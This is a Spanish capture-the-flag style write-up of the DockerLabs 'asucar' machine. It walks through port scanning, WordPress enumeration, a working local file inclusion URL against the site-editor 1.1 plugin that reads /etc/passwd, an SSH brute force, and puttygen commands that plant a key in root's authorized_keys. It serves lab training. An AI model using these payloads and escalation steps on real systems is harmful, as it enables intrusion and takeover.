# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3f384ac3-7071-4676-97d3-72422646c53f)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.2p1
2.  **80/tcp(HTTP):** Apache httpd 2.4.59

### Puerto 8080
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Sobre el Asucar Moreno.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/54ec7f98-99c8-4daa-9738-96c519e0dbc6)

### DNS
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9fc82b45-82f9-40e3-a07d-46b1e8641cff)

Si hacemos click sobre algún botón, nos sale este mensaje, tenemos que agregar asucar.dl, a nuestro /etc/hosts.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/707781f2-a358-4e34-8545-c52c33ce0ed5)
Y ya funciona.

# Fase 2- Exploración

#### WP
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e8858ebd-f009-4022-bdab-c132e5997c4e)
La pagina web esta corriendo un wordpress, vamos a enumerar.
```python
> wpscan --url http://asucar.dl/ --random-user-agent
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://asucar.dl/ [172.17.0.2]
[+] Started: Sat Jun  8 11:43:27 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://asucar.dl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://asucar.dl/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://asucar.dl/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://asucar.dl/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://asucar.dl/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://asucar.dl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://asucar.dl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://asucar.dl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://asucar.dl/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jun  8 11:43:31 2024
[+] Requests Done: 171
[+] Cached Requests: 6
[+] Data Sent: 54.966 KB
[+] Data Received: 341.256 KB
[+] Memory used: 254.312 MB
[+] Elapsed time: 00:00:03
```
El escaneo de WPScan en `http://asucar.dl/` revela un servidor Apache/2.4.59 (Debian) con XML-RPC habilitado y listado de directorios activo en `http://asucar.dl/wp-content/uploads/`. El sitio utiliza WordPress versión 6.5.3 con el tema "twentytwentyfour" actualizado. Se identificó un plugin desactualizado llamado site-editor en la versión 1.1.

# Fase 3- Explotación

#### 1.1v
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/61fc8c35-937e-40a6-b787-38162928f7ff)
Encontramos un Local File Inclusion para el plugins `site-editor 1.1`.

#### 44340.txt
```
❯ searchsploit -m php/webapps/44340.txt

  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
    Codes: CVE-2018-7422
 Verified: True
File Type: Unicode text, UTF-8 text
cp: overwrite '/home/sansett/t4ifi/Maquinas/DockerLabs/Medias/asucar/scripts/44340.txt'? s
Copied to: /home/?/?/Maquinas/DockerLabs/Medias/asucar/scripts/44340.txt


❯ ls
 44340.txt
```
Lo bajamos, y dentro nos dice que para explotar esta vulnerabilidad tenemos que ejecutar de esta forma:
```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
Y se esta forma podríamos leer el passwd.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/be81aef2-0b5e-4878-99b5-8a43bbe00bfa)
Y lo conseguimos leer. Encontramos el usuario curiosito. Y si recordamos la maquina victima tiene el puerto 22 abierto, podemos hacer fuerza bruta.

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/438a7e9f-31ee-45b8-a07b-c9f3cd4c31e3)
Y encontramos la contraseña del usuario curiosito.

# Fase 4- Privilegios

#### sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/15adcfd1-5136-4e3b-8ffe-3907b333861c)

Despues de realizar el tratamiento de la TTY, al hacer el comando `sudo -l`, tenemos permisos de ejecución del binario `puttygen`.

#### puttygen
Puttygen se utiliza específicamente para generar claves SSH. Vamos a generar una clave para el usuario root.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/86ae8c9b-8c05-4a22-8fb8-7da63e117ab6)

Los comandos que ejecutamos fueron:
```python
- puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hacked

- puttygen -L ~/.ssh/hacked » ~/.ssh/authorized_keys

- sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hacked

- sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/authorized_keys -O public-openssh

- ssh -i /home/curiosito/.ssh/hacked root@localhost
```
on `puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hacked` se crea una clave RSA de 2048 bits y se guarda en `~/.ssh/hacked`. Luego, `puttygen -L ~/.ssh/hacked » ~/.ssh/authorized_keys` añade la clave pública a `~/.ssh/authorized_keys` para autenticación SSH. El comando `ssh -i /home/curiosito/.ssh/hacked root@localhost` inicia una conexión SSH usando la clave privada generada.


